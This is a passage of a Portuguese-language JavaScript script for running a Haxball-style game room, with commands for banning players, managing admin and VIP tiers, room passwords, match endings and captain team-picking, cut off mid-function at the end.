function listarJogadoresBanidos() {
    return new Promise((resolve, reject) => {
        const request = openBanimentosDatabase();

        request.onsuccess = function (event) {
            const db = event.target.result;
            const transaction = db.transaction(["banimentos"], "readonly");
            const banimentosStore = transaction.objectStore("banimentos");

            const cursorRequest = banimentosStore.openCursor();

            const jogadoresBanidos = [];

            cursorRequest.onsuccess = function (event) {
                const cursor = event.target.result;

                if (cursor) {
                    const banimento = cursor.value;
                    const jogadorBanido = `${banimento.nome}[${banimento.id}]`;

                    jogadoresBanidos.push(jogadorBanido);
                    cursor.continue();
                } else {
                    resolve(jogadoresBanidos.join(", "));
                }
            };

            cursorRequest.onerror = function (event) {
                reject("Erro ao listar jogadores banidos");
            };
        };

        request.onerror = function (event) {
            reject("Erro ao abrir o banco de dados de banimentos");
        };
    });
}

function desbanirJogador(player, id) {
    return new Promise((resolve, reject) => {
        const request = openBanimentosDatabase();

        request.onsuccess = function (event) {
            const db = event.target.result;
            const transaction = db.transaction(["banimentos"], "readwrite");
            const banimentosStore = transaction.objectStore("banimentos");

            const getRequest = banimentosStore.get(id);

            getRequest.onsuccess = function (event) {
                const banimento = event.target.result;

                if (banimento) {
                    banimentosStore.delete(id);

                    room.sendAnnouncement(`O jogador ${banimento.nome} [${id}] foi desbanido por ${player.name}.`, null, 0xF1F1F1, "bold", 2);
                    resolve();
                } else {
                    reject(`Jogador com ID ${id} não encontrado nos registros de banimentos.`);
                }
            };

            getRequest.onerror = function (event) {
                reject(`Erro ao obter o jogador com ID ${id} nos registros de banimentos.`);
            };
        };

        request.onerror = function (event) {
            reject("Erro ao abrir o banco de dados de banimentos");
        };
    });
}
// -----------------------------------------------


async function ban(player, message) {
    var msgArray = message.split(/ +/);
    var user = msgArray[1];
    var tempo = msgArray[2];
    var motivo = msgArray[3];

    if (user.startsWith("#")) {
        user = user.substring(1);
    } else if (!isNaN(user)) {
        return;
    } else {
        room.sendAnnouncement(`❌ Você não digitou o ID corretamente.`, player.id, 0xf1f1f1, "bold", 2);
        return false;
    }

    if (msgArray.length < 2) {
        room.sendAnnouncement("Por favor, digite o comando corretamente (ex: !ban #123 2d racismo).", player.id, 0xc1c1c1, "bold", 1);
        return false;
    }

    var jogadorEncontrado = await buscarJogadorPorIdOne(user);

    if (jogadorEncontrado) {
        room.sendAnnouncement(`Jogador encontrado ${jogadorEncontrado.nome}`);

        const tempoFinal = calcularTempoFinal(tempo);

        const banimento = {
            id: jogadorEncontrado.id,
            nome: jogadorEncontrado.nome,
            auth: jogadorEncontrado.auth,
            conn: jogadorEncontrado.conn,
            ipv4: jogadorEncontrado.ipv4,
            motivo: motivo,
            admin: player.name,
            tempoInicial: new Date(),
            tempoFinal: tempoFinal
        };

        var getUserRoom = room.getPlayerList().filter((p) => p.id == user);
        if (getUserRoom) room.kickPlayer(user, `Você foi banido pelo ${player.name}. Discord para contato:`, false)

        await addBanimento(banimento)
            .then(() => {
                room.sendAnnouncement(`✅ Jogador banido com sucesso!`, player.id, 0xF1F1F1, "bold", 2);
                if (urls.bans && urls.bans != "") {
                    fetch(urls.bans, {
                        method: 'POST',
                        body: JSON.stringify({
                            content: `🚧 Jogador ${player.name} banido pelo ${player.name}!\n- Motivo: ${motivo}\n- Punição acaba em: ${tempoFinal}`,
                            username: sanitizedRoomName,
                        }),
                        headers: {
                            'Content-Type': 'application/json',
                        },
                    }).then((res) => res);
                }
            })
            .catch((error) => {
                room.sendAnnouncement(`❌ Erro ao adicionar o banimento: ${error}`, player.id, 0xc1c1c1, "bold", 1);
                console.error(error);
            });
    } else {
        room.sendAnnouncement(`Jogador com ID ${user} não encontrado nos registros, procurando no pré-registro...`);

        var jogadorEncontrado2 = await buscarJogadorPorIdTwo(user);

        if (jogadorEncontrado2) {
            const tempoFinal = calcularTempoFinal(tempo);

            const banimento = {
                id: jogadorEncontrado2.id,
                nome: jogadorEncontrado2.nome,
                auth: jogadorEncontrado2.auth,
                conn: jogadorEncontrado2.conn,
                ipv4: jogadorEncontrado2.ipv4,
                motivo: motivo,
                admin: player.name,
                tempoInicial: new Date(),
                tempoFinal: tempoFinal
            };

            var getUserRoom = room.getPlayerList().filter((p) => p.id == user);
            if (getUserRoom) room.kickPlayer(user, `Você foi banido pelo ${player.name}. Discord para contato:`, false)

            await addBanimento(banimento)
                .then(() => {
                    room.sendAnnouncement(`✅ Jogador banido com sucesso!`, player.id, 0xF1F1F1, "bold", 2);
                })
                .catch((error) => {
                    room.sendAnnouncement(`❌ Erro ao adicionar o banimento: ${error}`, player.id, 0xc1c1c1, "bold", 1);
                    console.error(error);
                });
        } else {
            room.sendAnnouncement(`Ocorreu um erro e não foi possivel adicionar o banimento.`, player.id, 0xb1b1b1, "bold", 2);
            return false;
        }
    }
}

function banListCommand(player, message) {
    listarJogadoresBanidos().then((jogadoresBanidos) => {
        room.sendAnnouncement(`Jogadores banidos: ${jogadoresBanidos}`, player.id, 0xF1F1F1, "bold", 2);
    }).catch((error) => {
        room.sendAnnouncement(`Erro ao listar jogadores banidos: ${error}`, player.id, 0xc1c1c1, "bold", 1);
        console.error(error);
    });

    return false;
}

function setAdminCommand(player, message) {
    try {
        if (testMode || masterList.includes(authArray[player.id]) || donoList.includes(authArray[player.id])) {

            var msgArray = message.split(/ +/);

            var adminType = msgArray[2];
            var admin = msgArray[1];

            if (isNaN(admin)) {
                admin = admin.substring(1);
            }

            if (!admin) {
                room.sendAnnouncement(`Você precisa expecificar o tipo de admin:`, player.id, errorColor, 'bold', 2);
                room.sendAnnouncement(`Exemplo: !setadmin #123 1`, player.id, errorColor, 'bold');
                setTimeout(() => {
                    room.sendAnnouncement(`Tipos de admins: 1 (moderador), 2 (administrador), 3 (gerente), 4 (diretor)`, player.id, errorColor, 'bold');
                }, 2000);
                return false;
            }

            console.log(admin);

            if (msgArray.length > 0) {
                if (msgArray[0].length > 0) {
                    var targetId = parseInt(admin);
                    console.log(targetId);
                    var playerAdmin = room.getPlayerList().find((p) => p.id === targetId);

                    if (playerAdmin && playerAdmin !== undefined) {
                        if (account[playerAdmin.name]) {
                            console.log(playerAdmin);
                            if (adminType == 1) {
                                if (!mods.map((a) => a[0]).includes(authArray[playerAdmin.id])) {
                                    if (!masterList.includes(authArray[playerAdmin.id])) {
                                        if (!mods.includes(authArray[playerAdmin.id])) {
                                            room.setPlayerAdmin(playerAdmin.id, true)
                                            mods.push(authArray[playerAdmin.id]);

                                            room.sendAnnouncement(`${playerAdmin.name} Agora é um Moderador!!`, null, announcementColor, 'bold', HaxNotification.CHAT)
                                        } else {
                                            room.sendAnnouncement(`Este jogador já é um moderador!`, player.id, errorColor, 'bold', HaxNotification.CHAT);
                                        }
                                    } else {
                                        room.setPlayerAdmin(playerAdmin.id, false);
                                        masterList.splice(masterList.indexOf(authArray[playerAdmin.id], 1))
                                        room.sendAnnouncement(`Este jogador não é mais um Fundador!`, player.id, errorColor, 'bold', HaxNotification.CHAT)
                                    }
                                } else {
                                    room.setPlayerAdmin(playerAdmin.id, false);
                                    mods.splice(adminList.indexOf(authArray[playerAdmin.id], 1))
                                    room.sendAnnouncement(`Este jogador não é mais um moderador permanente!`, player.id, errorColor, 'bold', HaxNotification.CHAT)
                                }
                            } else if (adminType == 2) {
                                if (!adminList.map((a) => a[0]).includes(authArray[playerAdmin.id])) {
                                    if (!masterList.includes(authArray[playerAdmin.id])) {
                                        if (!adminList.includes(authArray[playerAdmin.id])) {
                                            room.setPlayerAdmin(playerAdmin.id, true)
                                            adminList.push(authArray[playerAdmin.id]);
                                            room.sendAnnouncement(`${playerAdmin.name} Agora é um Administrador!`, null, announcementColor, 'bold', HaxNotification.CHAT)
                                        } else {
                                            room.sendAnnouncement(`Este jogador já é um administrador!`, player.id, errorColor, 'bold', HaxNotification.CHAT)
                                        }
                                    } else {
                                        room.setPlayerAdmin(playerAdmin.id, false);
                                        masterList.splice(masterList.indexOf(authArray[playerAdmin.id], 1))
                                        room.sendAnnouncement(`Este jogador não é mais um Fundador!`, player.id, errorColor, 'bold', HaxNotification.CHAT)
                                    }
                                } else {
                                    room.setPlayerAdmin(playerAdmin.id, false);
                                    adminList.splice(adminList.indexOf([authArray[playerAdmin.id], playerAdmin.name], 1))
                                    room.sendAnnouncement(
                                        `Este jogador não é mais um administrador permanente!`,
                                        player.id, errorColor, 'bold', HaxNotification.CHAT)
                                }
                            } else if (adminType == 3) {
                                if (!gerentes.map((a) => a[0]).includes(authArray[playerAdmin.id])) {
                                    if (!masterList.includes(authArray[playerAdmin.id])) {
                                        if (!gerentes.includes(authArray[playerAdmin.id])) {
                                            room.setPlayerAdmin(playerAdmin.id, true)
                                            gerentes.push(authArray[playerAdmin.id]);
                                            room.sendAnnouncement(`${playerAdmin.name} Agora é um Gerente!`, null, announcementColor, 'bold', HaxNotification.CHAT)
                                        } else {
                                            room.sendAnnouncement(`Este jogador já é um gerente!`, player.id, errorColor, 'bold', HaxNotification.CHAT)
                                        }
                                    } else {
                                        room.setPlayerAdmin(playerAdmin.id, false);
                                        masterList.splice(masterList.indexOf(authArray[playerAdmin.id], 1))
                                        room.sendAnnouncement(`Este jogador não é mais um Fundador!`, player.id, errorColor, 'bold', HaxNotification.CHAT)
                                    }
                                } else {
                                    room.setPlayerAdmin(playerAdmin.id, false);
                                    gerentes.splice(adminList.indexOf(authArray[playerAdmin.id], 1))
                                    room.sendAnnouncement(`Este jogador não é mais um gerente permanente!`, player.id, errorColor, 'bold', HaxNotification.CHAT)
                                }
                            } else if (adminType == 4) {
                                if (!diretores.map((a) => a[0]).includes(authArray[playerAdmin.id])) {
                                    if (!masterList.includes(authArray[playerAdmin.id])) {
                                        if (!diretores.includes(authArray[playerAdmin.id])) {
                                            room.setPlayerAdmin(playerAdmin.id, true)
                                            diretores.push(authArray[playerAdmin.id]);
                                            room.sendAnnouncement(`${playerAdmin.name} Agora é um Diretor!`, null, announcementColor, 'bold', HaxNotification.CHAT)
                                        } else {
                                            room.sendAnnouncement(`Este jogador já é um diretor!`, player.id, errorColor, 'bold', HaxNotification.CHAT)
                                        }
                                    } else {
                                        room.setPlayerAdmin(playerAdmin.id, false);
                                        masterList.splice(masterList.indexOf(authArray[playerAdmin.id], 1))
                                        room.sendAnnouncement(`Este jogador não é mais um Fundador!`, player.id, errorColor, 'bold', HaxNotification.CHAT)
                                    }
                                } else {
                                    room.setPlayerAdmin(playerAdmin.id, false);
                                    diretores.splice(adminList.indexOf(authArray[playerAdmin.id], 1))
                                    room.sendAnnouncement(`Este jogador não é mais um diretor permanente!`, player.id, errorColor, 'bold', HaxNotification.CHAT)
                                }
                            }
                        } else {
                            room.sendAnnouncement(`❌ Esse jogador não está registrado!`, player.id, 0xFFFFFF, "bold", 2);
                            return false;
                        }
                    } else {
                        room.sendAnnouncement(`Não tem um jogador com esse ID na sala. Digite "!ajuda setadmin" para obter mais informações.`, player.id, errorColor, 'bold', HaxNotification.CHAT);
                    }
                } else {
                    room.sendAnnouncement(`Formato incorreto de argumentos. Digite "!ajuda setadmin" para obter mais informações.`, player.id, errorColor, 'bold', HaxNotification.CHAT);
                }
            } else {
                room.sendAnnouncement(`Número incorreto de argumentos. Digite "!ajuda setadmin" para obter mais informações.`, player.id, errorColor, 'bold', HaxNotification.CHAT);
            }
        }
    } catch (err) {
        error(err, 'Set Admin Command');
    }
}

function adminListCommand(player, message) {
    var allUsers = [].concat(masterList, donoList, diretores, gerentes, adminList, mods, dono, gerente);

    if (allUsers.length === 0) {
        room.sendAnnouncement(
            "📢 Não há ninguém na lista de administradores.",
            player.id,
            announcementColor,
            'bold',
            null
        );
        return false;
    }

    var cstm = '📢 Lista admin: ';
    for (let i = 0; i < allUsers.length; i++) {
        var userId = allUsers[i][0];

        cstm += ` [${userId}], `;
    }

    cstm = cstm.substring(0, cstm.length - 2) + '.';
    room.sendAnnouncement(
        cstm,
        player.id,
        announcementColor,
        'bold',
        null
    );
}

function removeUserFromList(list, user) {
    if (list.includes(user)) {
        list.splice(list.indexOf(user), 1);
    }
    return list;
}

function removerAdmin(player, message) {
    var msgArray = message.split(/ +/);

    if (msgArray.length > 1 && msgArray[1].startsWith("#")) {
        msgArray[1] = msgArray[1].substring(1);
    }

    var targetId = parseInt(msgArray[1]);

    if (!isNaN(targetId)) {
        var allUsers = [].concat(masterList, donoList, diretores, gerentes, adminList, mods, dono, gerente);

        if (targetId <= allUsers.length && targetId > 0) {
            var targetUser = allUsers[targetId - 1];

            if (adminList.includes(targetUser)) {
                adminList.splice(adminList.indexOf(targetUser), 1);
            }

            masterList = removeUserFromList(masterList, targetUser);
            donoList = removeUserFromList(donoList, targetUser);
            diretores = removeUserFromList(diretores, targetUser);
            gerentes = removeUserFromList(gerentes, targetUser);
            mods = removeUserFromList(mods, targetUser);
            dono = removeUserFromList(dono, targetUser);
            gerente = removeUserFromList(gerente, targetUser);

            room.setPlayerAdmin(targetUser[0], false); // Alterado para targetUser[0]

            room.sendAnnouncement('Admin removido com sucesso!',
                player.id, announcementColor, 'bold', null);
        } else {
            room.sendAnnouncement('ID de jogador inválido!',
                player.id, announcementColor, 'bold', null);
        }
    } else {
        room.sendAnnouncement('Formato de ID inválido!',
            player.id, announcementColor, 'bold', null);
    }

    return false;
}

function showVips(player, message) {
    let i = 1
    let vipsNames = ""
    if (vips.length > 0) {
        vips.forEach(function (item) {
            vipsNames += item.name + '[' + i + '], '
            i++
        })
        room.sendAnnouncement(`Lista de jogadores Vips:\n` + vipsNames,
            player.id, announcementColor, 'bold', null)
    } else {
        room.sendAnnouncement(`Lista de jogadores Vips Vazia!`,
            player.id, announcementColor, 'bold', null)
    }
}

function removerVip(player, message) {
    var msgArray = message.split(/ +/).slice(1)
    if (vips.length > 0 && vips[msgArray[0] - 1]) {
        room.sendAnnouncement(`VIP do jogador ${vips[msgArray[0] - 1].name} removido!`,
            player.id, announcementColor, 'bold', null)
        vips.splice(msgArray[0] - 1, 1)
    } else {
        room.sendAnnouncement(`ID de jogador Vip inválido!`,
            player.id, errorColor, 'bold', null)
    }
}

function setVipCommand(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    if (msgArray.length > 0) {
        if (msgArray[0].length > 0 && msgArray[0][0] == '#') {
            var numVip = msgArray[1]
            msgArray[0] = msgArray[0].substring(1, msgArray[0].length);
            if (room.getPlayer(parseInt(msgArray[0])) != null && numVip != null) {
                var playerVip = room.getPlayer(parseInt(msgArray[0]))
                if (numVip == 1) {
                    var resSetVip = false
                    if (vips[authArray[playerVip.id]]) {
                        resSetVip = true
                    }
                    if (!resSetVip) {
                        vips[authArray[playerVip.id]] =
                        {
                            name: playerVip.name,
                            auth: authArray[playerVip.id],
                            tipoVip: 1,
                            corChat: "",
                            fonte: 0,
                            pausarJogoOFF: false,
                            furarFila: false,
                            provos: {},
                            unis: {},
                            avatarGol: [],
                            msgEntrada: ''
                        }
                        room.sendAnnouncement(`${playerVip.name} agora é VIP!`,
                            null, announcementColor, 'bold', HaxNotification.CHAT)
                        vip1Password = getRandomInt2(10000, 99999)
                        sendPasswordVip()
                    } else {
                        delete vips[authArray[playerVip.id]]
                        room.sendAnnouncement(`${playerVip.name} não é mais VIP!`,
                            null, announcementColor, 'bold', HaxNotification.CHAT)
                    }
                } else if (numVip == 2) {
                    var resSetVip = false
                    if (vips[authArray[playerVip.id]]) {
                        resSetVip = true
                    }
                    if (!resSetVip) {
                        vips[authArray[playerVip.id]] =
                        {
                            name: playerVip.name,
                            auth: authArray[playerVip.id],
                            tipoVip: 2,
                            corChat: "",
                            fonte: 0,
                            pausarJogoOFF: false,
                            furarFila: true,
                            provos: {},
                            unis: {},
                            avatarGol: [],
                            msgEntrada: ''
                        }
                        room.sendAnnouncement(
                            `${playerVip.name} agora é VIP!`,
                            null,
                            announcementColor,
                            'bold',
                            HaxNotification.CHAT)
                        vip2Password = getRandomInt2(100000, 199999)
                        sendPasswordVip()
                    } else {
                        delete vips[authArray[playerVip.id]]
                        room.sendAnnouncement(`${playerVip.name} não é mais VIP!`,
                            null, announcementColor, 'bold', HaxNotification.CHAT)
                    }
                } else if (numVip == 3) {
                    var resSetVip = false
                    if (vips[authArray[playerVip.id]]) {
                        resSetVip = true
                    }
                    if (!resSetVip) {
                        vips[authArray[playerVip.id]] =
                        {
                            name: playerVip.name,
                            auth: authArray[playerVip.id],
                            tipoVip: 3,
                            corChat: "",
                            fonte: 0,
                            pausarJogoOFF: false,
                            furarFila: true,
                            provos: {},
                            unis: {},
                            avatarGol: [],
                            msgEntrada: ''
                        }
                        room.sendAnnouncement(`${playerVip.name} agora é VIP!`,
                            null, announcementColor, 'bold', HaxNotification.CHAT)
                        vip3Password = getRandomInt2(200000, 299999)
                        sendPasswordVip()
                    } else {
                        delete vips[authArray[playerVip.id]]
                        room.sendAnnouncement(`${playerVip.name} não é mais VIP!`,
                            null, announcementColor, 'bold', HaxNotification.CHAT)
                    }
                } else if (numVip == 4) {
                    var resSetVip = false
                    if (vips[authArray[playerVip.id]]) {
                        resSetVip = true
                    }
                    if (!resSetVip) {
                        vips[authArray[playerVip.id]] =
                        {
                            name: playerVip.name,
                            auth: authArray[playerVip.id],
                            tipoVip: 4,
                            corChat: "",
                            fonte: 0,
                            pausarJogoOFF: false,
                            furarFila: true,
                            provos: {},
                            unis: {},
                            avatarGol: [],
                            msgEntrada: ''
                        }
                        room.sendAnnouncement(`${playerVip.name} agora é VIP!`,
                            null, announcementColor, 'bold', HaxNotification.CHAT)
                        vip4Password = getRandomInt2(300000, 499999)
                        sendPasswordVip()
                    } else {
                        delete vips[authArray[playerVip.id]]
                        room.sendAnnouncement(`${playerVip.name} não é mais VIP!`,
                            null, announcementColor, 'bold', HaxNotification.CHAT)
                    }
                } else {
                    room.sendAnnouncement(
                        `Não há jogador com tal ID na sala. Digite "!ajuda setvip" para obter mais informações.`,
                        player.id,
                        errorColor,
                        'bold',
                        HaxNotification.CHAT)
                }
            } else {
                room.sendAnnouncement(
                    `Formato incorreto para seu argumento. Digite "!ajuda setvip" para obter mais informações.`,
                    player.id,
                    errorColor,
                    'bold',
                    HaxNotification.CHAT)
            }
        } else {
            room.sendAnnouncement(
                `Número incorreto de argumentos. Digite "!ajuda setvip" para obter mais informações.`,
                player.id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            );
        }
    }
}

function sendLinkDiscord(player, message) {
    room.sendAnnouncement(`Link do nosso discord: ${discord}`,
        player.id,
        0x426AD6,
        'bold',
        HaxNotification.CHAT
    )
}

function passwordCommand(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    if (msgArray.length > 0) {
        if (msgArray.length == 1 && msgArray[0] == '') {
            roomPassword = '';
            room.setPassword(null);
            room.sendAnnouncement(
                `A senha da sala foi removida.`,
                player.id,
                announcementColor,
                'bold',
                HaxNotification.CHAT
            );
        }
        roomPassword = msgArray.join(' ');
        room.setPassword(roomPassword);
        room.sendAnnouncement(
            `A senha da sala foi definida como ${roomPassword}`,
            player.id,
            announcementColor,
            'bold',
            HaxNotification.CHAT
        );
    } else {
        if (roomPassword != '') {
            roomPassword = '';
            room.setPassword(null);
            room.sendAnnouncement(
                `A senha da sala foi removida.`,
                player.id,
                announcementColor,
                'bold',
                HaxNotification.CHAT
            );
        } else {
            room.sendAnnouncement(
                `A sala atualmente não tem uma senha. Digite "!ajuda password" para obter mais informações.`,
                player.id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            );
        }
    }
}

/* GAME FUNCTIONS */

function checkTime() {
    const scores = room.getScores();
    if (game != undefined) game.scores = scores;
    if (Math.abs(scores.time - scores.timeLimit) <= 0.01 && scores.timeLimit != 0 && playSituation == Situation.PLAY) {
        if (scores.red != scores.blue) {
            if (!checkTimeVariable) {
                checkTimeVariable = true;
                setTimeout(() => {
                    checkTimeVariable = false;
                }, 3000);
                scores.red > scores.blue ? endGame(Team.RED) : endGame(Team.BLUE);
                stopTimeout = setTimeout(() => {
                    room.stopGame();
                }, 2000);
            }
            return;
        }
        if (drawTimeLimit != 0) {
            goldenGoal = true;
            room.sendAnnouncement(
                'Tempo de jogo atingido! +1m de acréscimo.\n⚽ Gol de ouro!!!',
                null,
                0xffefd6,
                'bold',
                HaxNotification.CHAT
            );
        }
    }
    if (Math.abs(scores.time - drawTimeLimit * 60 - scores.timeLimit) <= 0.01 && scores.timeLimit != 0) {
        if (!checkTimeVariable) {
            checkTimeVariable = true;
            setTimeout(() => {
                checkTimeVariable = false;
            }, 10);
            endGame(Team.SPECTATORS);
            room.stopGame();
            goldenGoal = false;
        }
    }
}

function instantRestart() {
    room.stopGame();
    startTimeout = setTimeout(() => {
        room.startGame();
    }, 10);
}

function resumeGame() {
    startTimeout = setTimeout(() => {
        room.startGame();
    }, 1000);
    setTimeout(() => {
        room.pauseGame(false);
    }, 500);
}

function endGame(winner) {
    if (players.length >= 2 * teamSize - 1) activateChooseMode();
    const scores = room.getScores();
    game.scores = scores;
    lastWinner = winner;
    endGameVariable = true;
    pagamentoAposta(winner)
    if (winner == Team.RED) {
        streak++;
        room.sendAnnouncement(
            `✨ Equipe Vermelha ganhou de ${scores.red}x${scores.blue}!`,
            null,
            redColor,
            'bold',
            HaxNotification.CHAT
        )
        if (players.length >= 2 * teamSize) {
            let vermelho = []
            for (let player of teamRed) {
                vermelho.push([player.id, player.name])
            }
            if (JSON.stringify(lastTeamStreak) == JSON.stringify(vermelho)) {
                streakRecord++
            } else {
                streakRecord = 1
                lastTeamStreak = []
                for (let player of teamRed) {
                    lastTeamStreak.push([player.id, player.name])
                }
            }
            room.sendAnnouncement(`🔁 Sequência de Vitórias por um time composto pelos mesmos jogadores: ${streakRecord}`,
                null, redColor, 'bold', HaxNotification.CHAT)
        }
    } else if (winner == Team.BLUE) {
        streak = 1;
        room.sendAnnouncement(`✨ Equipe Azul ganhou de ${scores.blue}x${scores.red}!`,
            null, blueColor, 'bold', HaxNotification.CHAT)
        if (players.length >= 2 * teamSize) {
            let azul = []
            for (let player of teamRed) {
                azul.push([player.id, player.name])
            }
            if (JSON.stringify(lastTeamStreak) == JSON.stringify(azul)) {
                streakRecord++
            } else {
                streakRecord = 1
                lastTeamStreak = []
                for (let player of teamBlue) {
                    lastTeamStreak.push([player.id, player.name])
                }
            }
            room.sendAnnouncement(`🔁 Sequência de Vitórias por um time composto pelos mesmos jogadores: ${streakRecord}`,
                null, blueColor, 'bold', HaxNotification.CHAT)
        }
    } else {
        streak = 0;
        room.sendAnnouncement(
            '💤 Empate! | Tempo esgotado |',
            null,
            0xF8F8FF,
            'bold',
            HaxNotification.CHAT
        );
    }
    if (streakRecord > streakMax) {
        streakMax = streakRecord
        localStorage.setItem('streakRecord', JSON.stringify(lastTeamStreak))
    }
    let possessionRedPct = (possession[0] / (possession[0] + possession[1])) * 100;
    let possessionBluePct = 100 - possessionRedPct;
    let possessionString = `🔴 ${possessionRedPct.toFixed(0)}% - ${possessionBluePct.toFixed(0)}% 🔵`;
    let actionRedPct = (actionZoneHalf[0] / (actionZoneHalf[0] + actionZoneHalf[1])) * 100;
    let actionBluePct = 100 - actionRedPct;
    let actionString = `🔴 ${actionRedPct.toFixed(0)}% - ${actionBluePct.toFixed(0)}% 🔵`;
    let CSString = getCSString(scores);
    room.sendAnnouncement(
        `📊 Posse: 🔴 ${possessionString} | ` +
        `📊 Zona de ação: 🔴 ${actionString} | ` +
        `${CSString}`,
        null,
        0xF8F8FF,
        'bold',
        HaxNotification.NONE
    );
    updateStats();
}

/* CHOOSING FUNCTIONS */

function activateChooseMode() {
    chooseMode = true;
    slowMode = chooseModeSlowMode;
    room.sendAnnouncement(
        `🐢 Modo chat lento alterado para escolher em: ${chooseModeSlowMode}s.`,
        null,
        announcementColor,
        'bold',
        HaxNotification.CHAT
    );
}

function deactivateChooseMode() {
    chooseMode = false;
    clearTimeout(timeOutCap);
    if (slowMode != defaultSlowMode) {
        slowMode = defaultSlowMode;
        room.sendAnnouncement(
            `🐢 Modo chat lento alterado para normal em: ${defaultSlowMode}s.`,
            null,
            announcementColor,
            'bold',
            HaxNotification.CHAT
        );
    }
    redCaptainChoice = '';
    blueCaptainChoice = '';
}

function getSpecList(player) {
    if (player == null) return null;
    var cstm = 'Players : ';
    for (let i = 0; i < teamSpec.length; i++) {
        cstm += teamSpec[i].name + `[${i + 1}], `;
    }
    cstm = cstm.substring(0, cstm.length - 2) + '.';
    room.sendAnnouncement(
        cstm,
        player.id,
        infoColor,
        'bold',
        HaxNotification.CHAT
    );
}

function choosePlayer() {
    clearTimeout(timeOutCap);
    let captain;
    if (teamRed.length <= teamBlue.length && teamRed.length != 0) {
        captain = teamRed[0];
    } else if (teamBlue.length < teamRed.length && teamBlue.length != 0) {
        captain = teamBlue[0];
    }
    if (captain != null) {
        room.sendAnnouncement(
            "Para escolher um jogador, digite seu número na lista fornecida ou use 'top', 'random' ou 'bottom'.",
            captain.id,
            infoColor,
            'bold',
            HaxNotification.MENTION
        );
        timeOutCap = setTimeout(
            (player) => {
                room.sendAnnouncement(
                    `Apresse-se ${player.name}, apenas ${Number.parseInt(String(chooseTime / 2))} segundos restantes para escolher!`,
                    player.id,
                    warningColor,
                    'bold',
                    HaxNotification.MENTION
                );
                timeOutCap = setTimeout(
                    (player) => {
                        room.kickPlayer(
                            player.id,
                            "Tu não escolheu a tempo!",
                            false
                        )
                    },
                    chooseTime * 500,
                    captain
                );
            },
            chooseTime * 1000,
            captain
        );
    }
    if (teamRed.length != 0 && teamBlue.length != 0) {
        getSpecList(teamRed.length <= teamBlue.length ? teamRed[0] : teamBlue[0]);
    }
}

function chooseModeFunction(player, message) {
    var msgArray = message.split(/ +/);
    if (player.id == teamRed[0].id || player.id == teamBlue[0].id) {
        if (teamRed.length <= teamBlue.length && player.id == teamRed[0].id) {
            if (['top', 'auto'].includes(msgArray[0].toLowerCase())) {
                room.setPlayerTeam(teamSpec[0].id, Team.RED);
                redCaptainChoice = 'top';
                clearTimeout(timeOutCap);
                room.sendAnnouncement(
                    `${player.name} escolheu Top!`,
                    null,
                    announcementColor,
                    'bold',
                    HaxNotification.CHAT
                );
            } else if (['random', 'rand'].includes(msgArray[0].toLowerCase())) {
                var r = getRandomInt(teamSpec.length);
                room.setPlayerTeam(teamSpec[r].id, Team.RED);
                redCaptainChoice = 'random';
                clearTimeout(timeOutCap);
                room.sendAnnouncement(
                    `${player.name} escolheu o Random!`,
                    null,
                    announcementColor,
                    'bold',
                    HaxNotification.CHAT
                );
            } else if (['bottom', 'bot'].includes(msgArray[0].toLowerCase())) {
                room.setPlayerTeam(teamSpec[teamSpec.length - 1].id, Team.RED);
                redCaptainChoice = 'bottom';
                clearTimeout(timeOutCap);
                room.sendAnnouncement(
                    `${player.name} escolheu o Bottom!`,
                    null,
                    announcementColor,
                    'bold',
                    HaxNotification.CHAT
                );
            } else if (!Number.isNaN(Number.parseInt(msgArray[0]))) {
                if (Number.parseInt(msgArray[0]) > teamSpec.length || Number.parseInt(msgArray[0]) < 1) {
                    room.sendAnnouncement(
                        `Seu número é inválido!`,
                        player.id,
                        errorColor,
                        'bold',
                        HaxNotification.CHAT
                    );
                } else {
                    room.setPlayerTeam(
                        teamSpec[Number.parseInt(msgArray[0]) - 1].id,
                        Team.RED
                    );
                    room.sendAnnouncement(
                        `${player.name} escolheu ${teamSpec[Number.parseInt(msgArray[0]) - 1].name} !`,
                        null,
                        announcementColor,
                        'bold',
                        HaxNotification.CHAT
                    );
                }
            } else return false;
            return true;
        }
        if (teamRed.length > teamBlue.length && player.id == teamBlue[0].id) {
            if (['top', 'auto'].includes(msgArray[0].toLowerCase())) {
                room.setPlayerTeam(teamSpec[0].id, Team.BLUE);
                blueCaptainChoice = 'top';
                clearTimeout(timeOutCap);
                room.sendAnnouncement(
                    `${player.name} escolheu Top!`,
                    null,
                    announcementColor,
                    'bold',
                    HaxNotification.CHAT
                );
            } else if (['random', 'rand'].includes(msgArray[0].toLowerCase())) {
                room.setPlayerTeam(
                    teamSpec[getRandomInt(teamSpec.length)].id,
                    Team.BLUE
                );
                blueCaptainChoice = 'random';
                clearTimeout(timeOutCap);
                room.sendAnnouncement(
                    `${player.name} escolheu Random!`,
                    null,
                    announcementColor,
                    'bold',
                    HaxNotification.CHAT
                );
            } else if (['bottom', 'bot'].includes(msgArray[0].toLowerCase())) {
                room.setPlayerTeam(teamSpec[teamSpec.length - 1].id, Team.BLUE);
                blueCaptainChoice = 'bottom';
                clearTimeout(timeOutCap);
                room.sendAnnouncement(
                    `${player.name} escolheu Bottom!`,
                    null,
                    announcementColor,
                    'bold',
                    HaxNotification.CHAT
                );
            } else if (!Number.isNaN(Number.parseInt(msgArray[0]))) {
                if (Number.parseInt(msgArray[0]) > teamSpec.length || Number.parseInt(msgArray[0]) < 1) {
                    room.sendAnnouncement(
                        `Seu número é inválido!`,
                        player.id,
                        errorColor,
                        'bold',
                        HaxNotification.CHAT
                    );
                } else {
                    room.setPlayerTeam(
                        teamSpec[Number.parseInt(msgArray[0]) - 1].id,
                        Team.BLUE
                    );
                    room.sendAnnouncement(
                        `${player.name} escolheu ${teamSpec[Number.parseInt(msgArray[0]) - 1].name} !`,
                        null,
                        announcementColor,
                        'bold',
                        HaxNotification.CHAT
                    );
                }
            } else return false;
            return true;
        }
    }
}

function checkCaptainLeave(player) {
    if (
        (teamRed.findIndex((red) => red.id == player.id) == 0 && chooseMode && teamRed.length <= teamBlue.length) ||
        (teamBlue.findIndex((blue) => blue.id == player.id) == 0 && chooseMode && teamBlue.length < teamRed.length)
    ) {
        choosePlayer();
        capLeft = true;
        setTimeout(() => {
            capLeft = false;
        }, 10);
    }
}

function slowModeFunction(player, message) {
    if (!player.admin) {
        if (tipoVip >= 2) {
            if (!SMSet.has(player.id)) {
                SMSet.add(player.id);
                setTimeout(
                    (number) => {
                        SMSet.delete(number);
                    },
